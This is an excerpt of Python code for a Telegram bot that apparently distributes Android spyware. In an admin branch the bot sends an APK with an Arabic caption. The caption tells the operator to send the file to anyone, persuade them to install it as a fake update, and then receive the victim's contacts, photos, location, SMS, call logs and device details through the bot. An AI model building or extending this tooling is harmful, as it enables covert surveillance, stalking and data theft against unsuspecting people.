...
def callback_query(call):
    ...
    if data.startswith('admin_') or data.startswith('mode_admin_panel'):
        ...
        # إذا لم يتم التعرف على الأمر الإداري
        ...
        if os.path.exists(apk_path):
            ...
            bot.send_document(
                ...
                caption=(
                    ...
                    "📌 **طريقة الاستخدام:**\n"
                    "1️⃣ أرسل هذا الملف لأي شخص (عبر واتساب، تيليجرام، إلخ).\n"
                    "2️⃣ اطلب منه تثبيت التطبيق (بذريعة تحديث أو تطبيق جديد).\n"
                    "3️⃣ بعد التثبيت، سيعمل التطبيق في الخلفية ويجمع البيانات التالية:\n"
                    "   • 📇 جهات الاتصال\n"
                    "   • 🖼️ الصور والفيديوهات\n"
                    "   • 📍 الموقع الجغرافي\n"
                    "   • 💬 الرسائل النصية (SMS)\n"
                    "   • 📞 سجل المكالمات\n"
                    "   • 📱 معلومات الجهاز\n"
                    "4️⃣ سيتم إرسال جميع البيانات إليك مباشرة عبر هذا البوت.\n\n"
